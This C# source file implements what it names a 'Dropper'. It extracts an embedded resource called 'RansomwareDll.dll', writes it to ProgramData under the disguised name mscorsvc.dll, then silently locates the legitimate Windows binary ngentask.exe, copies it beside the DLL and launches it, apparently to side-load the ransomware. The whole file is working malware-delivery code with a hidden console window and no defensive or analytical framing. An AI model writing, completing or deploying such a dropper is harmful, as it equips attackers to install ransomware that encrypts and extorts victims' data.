using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.IO;
using System.Diagnostics;

namespace Dropper
{
    public class Dropper
    {
        public Dropper()
        {
            var malDll = Assembly.GetExecutingAssembly();

            using (var rs = malDll.GetManifestResourceStream("Dropper.RansomwareDll.dll"))
            {
                // ProgramData path
                var pathProgramData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

                // Create a new path with our directory
                var xhorPath = Path.Combine(pathProgramData, "xhor");

                // Finally create the directory
                var xhorDir = Directory.CreateDirectory(xhorPath);

                // Create a new path for our DLL
                var dllPath = Path.Combine(xhorDir.FullName, "mscorsvc.dll");

                // Move the DLL to the target mscorsvc.dll file (created new)
                using (var fs = File.Create(dllPath))
                {
                    rs.CopyTo(fs);

                    rs.Close();
                }


                // Find ngentask.exe in WinSxS
                string psCommand = @"powershell -Command ""Get-ChildItem -Path 'C:\Windows\WinSxS' -Recurse -Filter 'ngentask.exe' -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName""";

                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + psCommand)
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                string ngentaskPath = null;

                using (Process proc = Process.Start(psi))
                {
                    ngentaskPath = proc.StandardOutput.ReadLine()?.Trim();
                    proc.WaitForExit();
                }

                // Copy ngentask.exe to our folder
                if (!string.IsNullOrWhiteSpace(ngentaskPath) && File.Exists(ngentaskPath))
                {
                    string dstPath = Path.Combine(xhorPath, Path.GetFileName(ngentaskPath));
                    File.Copy(ngentaskPath, dstPath, overwrite: true);
                    Process.Start(dstPath);

                }
                else
                {
                    Console.WriteLine($"Not found: {ngentaskPath}");
                }
            }
        }
    }
}
